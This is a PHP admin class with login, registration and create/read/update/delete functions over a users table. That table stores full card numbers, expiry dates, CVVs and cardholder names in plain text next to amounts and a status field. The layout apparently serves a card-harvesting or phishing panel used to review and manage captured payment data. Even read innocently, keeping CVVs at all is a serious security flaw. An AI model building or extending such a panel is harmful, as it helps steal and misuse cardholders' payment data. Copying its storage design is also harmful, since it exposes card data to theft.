<?php
require_once "database.php";

class Admin
{
    private $db;
    private $conn;

    public function __construct()
    {
        $this->db = new Database();
        $this->conn = $this->db->getConnection();
    }

    // Login and registration methods (previous code)...
    public function register($username, $password)
    {
        // Check if username already exists
        $stmt = $this->conn->prepare("SELECT id FROM admin_users WHERE username=?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result->num_rows > 0) {
            $stmt->close();
            return false; // username exists
        }

        $stmt->close();

        // Hash the password
        $hashedPassword = password_hash($password, PASSWORD_DEFAULT);

        // Insert new admin
        $stmt = $this->conn->prepare("INSERT INTO admin_users (username, password) VALUES (?, ?)");
        $stmt->bind_param("ss", $username, $hashedPassword);
        $stmt->execute();
        $stmt->close();

        return true;
    }

    public function login($username, $password)
    {
        // Prepare SQL to fetch admin by username
        $stmt = $this->conn->prepare("SELECT id, username, password FROM admin_users WHERE username=?");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $result = $stmt->get_result();
        $admin = $result->fetch_assoc();
        $stmt->close();

        if ($admin) {
            // Verify password
            if (password_verify($password, $admin['password'])) {
                // Password matches, start session
                $_SESSION['admin_id'] = $admin['id'];
                $_SESSION['admin_username'] = $admin['username'];
                return true;
            } else {
                // Password does not match
                return false;
            }
        } else {
            // Username not found
            return false;
        }
    }



    // Fetch all users
    public function getAllUsers()
    {
        $stmt = $this->conn->prepare("SELECT * FROM users ORDER BY id DESC");
        $stmt->execute();
        $result = $stmt->get_result();
        $users = $result->fetch_all(MYSQLI_ASSOC);
        $stmt->close();
        return $users;
    }

    // Fetch a single user by ID
    public function getUserById($id)
    {
        $stmt = $this->conn->prepare("SELECT * FROM users WHERE id=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $result = $stmt->get_result();
        $user = $result->fetch_assoc();
        $stmt->close();
        return $user;
    }

    // Update user info
    public function updateUser($id, $name, $mobile, $amount, $card_number, $mm, $yy, $cvv, $ch_name, $save_next, $status)
    {
        $stmt = $this->conn->prepare("UPDATE users 
            SET name=?, mobile=?, amount=?, card_number=?, mm=?, yy=?, cvv=?, ch_name=?, save_next=?, status=? WHERE id=?");
        $stmt->bind_param("ssdsssssiii", $name, $mobile, $amount, $card_number, $mm, $yy, $cvv, $ch_name, $save_next, $status, $id);
        $stmt->execute();
        $stmt->close();
    }

    // Delete a user
    public function deleteUser($id)
    {
        $stmt = $this->conn->prepare("DELETE FROM users WHERE id=?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->close();
    }

    public function __destruct()
    {
        $this->db->close();
    }
}
?>